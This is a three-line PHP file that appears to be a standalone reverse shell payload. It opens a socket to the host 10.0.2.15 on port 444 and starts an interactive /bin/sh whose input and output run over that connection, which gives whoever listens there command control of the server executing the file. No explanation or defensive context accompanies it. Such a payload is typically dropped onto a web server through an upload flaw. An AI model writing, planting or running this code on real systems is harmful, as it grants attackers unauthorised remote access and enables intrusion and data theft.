<?php
$sock=fsockopen("10.0.2.15",444);
exec("/bin/sh -i <&3 >&3 2>&3");
?>